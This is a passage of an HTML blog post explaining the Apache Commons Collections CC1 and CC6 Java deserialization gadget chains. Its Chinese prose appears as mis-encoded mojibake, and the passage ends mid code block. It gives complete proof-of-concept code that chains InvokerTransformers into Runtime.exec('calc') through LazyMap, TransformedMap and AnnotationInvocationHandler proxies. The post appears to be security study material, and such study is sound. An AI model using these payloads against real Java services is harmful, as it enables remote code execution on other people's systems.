class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)<br></code></pre></td></tr></table></figure><p>typeæ˜¯æ„é€ å¯¹è±¡æ—¶ä¼ è¿›æ¥çš„<code>Annotationå­ç±»</code>çš„<code>Class</code> </p><p>nameæ˜¯ä¼ å…¥Mapï¼ˆmemberValuesï¼‰çš„æ¯ä¸ªé”®å</p><p><code>memberType.get(name)</code>è¦ä¸ä¸ºç©º  å³è¦æ±‚<code>AnnotationType</code>è¦æœ‰åä¸º<code>name</code>çš„æˆå‘˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(AnnotationType.getInstance(Target.class).memberTypes());<br><span class="hljs-comment">// &#123;value=class [Ljava.lang.annotation.ElementType;&#125;</span><br>System.out.println(AnnotationType.getInstance(Retention.class).memberTypes());<br><span class="hljs-comment">// &#123;value=class java.lang.annotation.RetentionPolicy&#125;</span><br></code></pre></td></tr></table></figure><p>@Retentionå’Œ@Targetéƒ½æœ‰<code>value</code>è¿™ä¸ªæˆå‘˜</p><p>å¦å¤–ï¼Œ<code>AnnotationInvocationHandler</code>çš„æ„é€ æ–¹æ³•è¢«defaultä¿®é¥°ï¼Œä¸èƒ½ç›´æ¥newï¼Œè¦åˆ©ç”¨åå°„æ¥å®ä¾‹åŒ–è¯¥ç±»ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¾—åˆ°äº†<strong>CC1-TransformedMap-POC</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-number">114514</span>);<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">aih</span> <span class="hljs-operator">=</span> cons.newInstance(Target.class, evilMap);<br><br><span class="hljs-comment">// åºåˆ—åŒ–</span><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(aih);<br>oos.close();<br><br><span class="hljs-comment">// ååºåˆ—åŒ–</span><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>ois.close();<br></code></pre></td></tr></table></figure><p>ä½†è¿™ä¸ªCC1é—®é¢˜å¾ˆå¤šï¼Œé¦–å…ˆæ˜¯<code>sun.reflect.annotation.AnnotationInvocationHandler</code>ä½œä¸ºCC1é“¾çš„å…¥å£ç±»ï¼Œ åœ¨<strong>Jdk8u71</strong>ä¹‹åè¢«ä¿®æ”¹äº†ï¼Œä¿®æ”¹åçš„<code>readObject</code>æ–¹æ³•ä¸­æ–°å»ºäº†ä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ã€‚</p><p>æ‰€ä»¥ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„<code>LinkedHashMap</code>å¯¹è±¡ï¼Œè€ŒåŸæ¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„Mapä¸å†æ‰§è¡ŒsetValueæˆ–putæ“ä½œï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘RCEäº†ã€‚</p><p>æ¥ä¸‹æ¥å°±è¦å¼•å…¥<strong>CC1-LazyMap</strong>çš„æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯ysoserialä¸­çš„æ–¹æ³•ã€‚</p><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>åˆ†æå®Œä¸Šé¢çš„é“¾å­å…¶å®å°±å¾ˆæ˜¾ç„¶ï¼ŒCCé“¾çš„å…³é”®åœ¨äº<code>transform()</code>çš„è§¦å‘,ä¸Šé¢é‚£æ¡<code>TransformedMap</code>çš„è§¦å‘åœ¨äºâ€œå¤–æ´â€<code>AnnotationInvocationHandler</code>çš„<code>readObject</code>è°ƒç”¨äº†<code>setValue</code>ï¼Œè¿›è€Œè§¦å‘<code>TransformedMap</code>çš„<code>checkSetValue</code>ï¼Œè¿›è€Œè§¦å‘<code>transform()</code></p><p>è€Œ<code>LazyMap</code>æ˜¯å¦ä¸€ä¸ªè§¦å‘ç‚¹å¤‡é€‰ï¼Œå› ä¸º<code>LazyMap</code>çš„<code>get</code>æ–¹æ³•ä¸­ä¼šæ‰§è¡Œ<code>factory.transform()</code>ï¼Œä¹Ÿæš—åˆâ€œæ‡’åŠ è½½â€çš„çœŸè°›ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>            map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LazyMap</code>ç”±getè§¦å‘ï¼Œå¯¹æ¯”ä¸€ä¸‹å¯ä»¥å‘ç°ï¼š</p><ul><li>LazyMapï¼šgetå…ƒç´ æ—¶è§¦å‘</li><li>TransformedMapï¼šsetå…ƒç´ æ—¶è§¦å‘</li></ul><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>AnnotationInvocationHandler#readObject()<br>Map(Proxy)#entrySet()<br>AnnotationInvocationHandler#invoke()<br>LazyMap#get()<br>        <span class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>ChainedTransformer#transform()<br>ConstantTransformer#transform()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Class#getMethod()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Runtime#getRuntime()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Runtime#exec()<br></code></pre></td></tr></table></figure><p>ä¸å‰é¢åˆ†æçš„<code>TransformedMap</code>ä¸åŒï¼Œåœ¨<code>sun.reflect.annotation.AnnotationInvocationHandler</code>çš„<code>readObject</code>æ–¹æ³•ä¸­å¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨åˆ°Mapçš„getæ–¹æ³•ã€‚</p><p>ä½†æ˜¯ysoserialæ‰¾åˆ°äº†<code>AnnotationInvocationHandler</code>çš„invokeæ–¹æ³•ä¸­è°ƒç”¨äº†getï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>    <span class="hljs-comment">// Handle Object and Annotation methods</span><br>    <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>        paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>        <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>    <span class="hljs-keyword">switch</span>(member) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>            <span class="hljs-keyword">return</span> toStringImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>            <span class="hljs-keyword">return</span> hashCodeImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>            <span class="hljs-keyword">return</span> type;<br>    &#125;<br><br>    <span class="hljs-comment">// Handle annotation member accessors</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br>    <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>å®é™…æ˜¯ä¸ªä»£ç†ç±»ï¼Œå®ƒå®ç°äº†<code>InvocationHandler</code>æ¥å£ã€‚</p><p>æˆ‘ä»¬åªéœ€è¦å®Œæˆï¼š</p><ol><li><code>readObject</code>ä¸­è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œè°ƒç”¨è€…æ˜¯<code>AnnotationInvocationHandler</code>ä»£ç†å¯¹è±¡</li><li><code>AnnotationInvocationHandler</code>çš„<code>invoke</code>è§¦å‘<code>memberValues.get()</code> ï¼Œå› æ­¤ä»£ç†å¯¹è±¡çš„<code>memberValues</code>è¦è®¾ä¸º<code>LazyMap</code></li><li><code>LazyMap#get</code>è§¦å‘<code>factory.transform()</code></li></ol><p>é‚£ä¹ˆPOCä¹Ÿå°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>            <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">argMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">evilMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(argMap, chainedTransformer);<br><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler)constructor.newInstance(Retention.class, evilMap);<br>    <span class="hljs-comment">// ä»£ç†å¯¹è±¡proxyMap</span><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br><br>    handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);<br><br><br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>    oos.writeObject(handler);<br>    oos.close();<br><br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><p>POCä¸­è§¦å‘<code>invoke</code>çš„æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler#readObject =&gt; memberValues.entrySet()<br></code></pre></td></tr></table></figure><p>å› æ­¤<code>Proxy.newProxyInstance</code>ä¼ çš„æ˜¯<code>Map</code>çš„<code>ClassLoader</code>å’Œæ¥å£</p><p>ä½†æ˜¯ï¼Œ<code>LazyMap</code>çš„æ¼æ´è§¦å‘åœ¨getå’Œinvokeä¸­ è€Œ<code>TransformedMap</code>çš„æ¼æ´è§¦å‘åœ¨setValueä¸­ </p><p>åŒæ ·åœ¨ <strong>Jdk8u71</strong>ä¹‹åï¼Œç”±äº<code>AnnotationInvocationHandler</code>ä¸å†ç›´æ¥ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†ä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„<code>LinkedHashMap</code>å¯¹è±¡ã€‚ å› æ­¤CC1é“¾åªå±€é™åœ¨<strong>Jdk8u71</strong>ä¹‹å‰çš„ç‰ˆæœ¬ã€‚æ‰€ä»¥è¿™é‡Œå¼¹ä¸å‡ºcalcï¼Œä½†æ˜¯åŸç†æ˜¯è¿™ä¹ˆä¸ªåŸç†ã€‚</p><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>ä¸ºä»€ä¹ˆä¸æŒ‰é¡ºåºæ¥ï¼Œç¡®å®å› ä¸ºCC2çš„ç‰¹ç‚¹è·Ÿå‰é¢CC1æ¥ä¸ä¸Šï¼Œä½†æ˜¯CC6å¯ä»¥é¡ºå»¶å¾€ä¸‹è®²ï¼Œä¸Šé¢è¯´åˆ°<strong>Jdk8u71</strong>å¼•å…¥çš„<code>LinkedHashMap</code>è®©CC1å¤±æ•ˆï¼Œè€ŒCC6å…‹æœäº†è¿™ä¸€ç‚¹ï¼Œè„±èƒäºCC1ï¼Œæˆä¸ºJava8ç³»åˆ—å¸¸è§çš„åŸç”Ÿé“¾ã€‚</p><p>CC6é“¾å­ååŠæ®µè¿˜æ˜¯ä½¿ç”¨CC1çš„<code>LazyMap</code>ï¼Œç”±äº<code>AnnotationInvocationHandler</code>å› Javaç‰ˆæœ¬è€Œåˆ©ç”¨å—é™ï¼Œéœ€è¦æ‰¾å¯»å…¶ä»–å¯ä»¥è°ƒç”¨<code>LazyMap#get</code>çš„åœ°æ–¹ã€‚</p><p>è¿™é‡Œåˆè¦å¼•å…¥ä¸€ä¸ªå®Œç¾è§£å†³è¿™ä¸ªé—®é¢˜çš„ç±»äº†ï¼Œæ¥ä¸‹æ¥èµ¶åˆ°æˆ˜åœºçš„æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.commons.collections.keyvalue.TiedMapEntry<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry, KeyValue, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getKey</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> key;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>        <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>               (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ˜¾è€Œæ˜“è§çš„æ˜¯<code>getValue</code>éƒ¨åˆ†è°ƒç”¨äº†<code>get</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå°±æœ‰é“¾å­ï¼š</p><p><code>hashCode()</code> &#x3D;&gt; <code>getValue()</code> &#x3D;&gt; <code>map.get(key)</code></p><p>hashCodeæ˜¯åœ¨URLDNSä¸­ä¹Ÿç”¨åˆ°çš„ï¼Œä½œä¸ºä¸€ä¸ªè®¿é—®DNSçš„è§¦å‘å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// HashMap#readObject</span><br><span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>    putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>&#125;<br><span class="hljs-comment">// ====================================================================</span><br><span class="hljs-comment">// HashMap#hash</span><br><span class="hljs-comment">// è°ƒç”¨hashæ˜¯ä¸ºä¿è¯é”®çš„å”¯ä¸€æ€§</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br><span class="hljs-comment">// ====================================================================</span><br><span class="hljs-comment">// HashMap#put</span><br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªé“¾ï¼š</p><p><code>readObject()</code> &#x3D;&gt; <code>hash(key)</code> &#x3D;&gt; <code>key.hashCode()</code></p><p>æ‰€ä»¥æˆ‘ä»¬å°±èƒ½å¾—å‡ºï¼Œåœ¨è¿™é‡Œè®©<strong>key &#x3D;&#x3D; TiedMapEntryå¯¹è±¡</strong>ï¼Œå°±èƒ½å®Œç¾è¿æ¥èµ·æ¥å‰é¢çš„é“¾å­äº†ã€‚</p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>HashSet#readObject()<br>HashMap#put()<br>HashMap#hash()<br>TiedMapEntry#hashCode()<br>TiedMapEntry#getValue()<br>LazyMap#get()<br>                                <span class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>      ChainedTransformer.transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><p>åˆä»£ç›®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 